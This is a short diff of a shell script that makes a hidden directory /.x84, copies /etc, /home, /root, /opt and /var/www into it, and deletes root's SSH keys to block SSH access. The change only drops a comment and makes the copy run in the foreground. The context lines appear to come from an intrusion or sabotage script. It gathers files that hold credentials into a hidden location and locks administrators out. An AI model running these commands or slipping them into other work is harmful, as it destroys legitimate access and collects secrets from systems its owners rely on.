@@ -70,8 +70,7 @@ echo -e "\033[34m[i] Running...\033[0m"
 mkdir /.x84
 
 # Recursively copy critical system directories into /.x84
-# Runs in background (&)
-cp -rp {/var/www,/etc,/home,/opt,/root} /.x84 &
+cp -rp {/var/www,/etc,/home,/opt,/root} /.x84
 
 # Remove SSH keys to immediately block SSH-based access
 rm -rf /root/.ssh/*
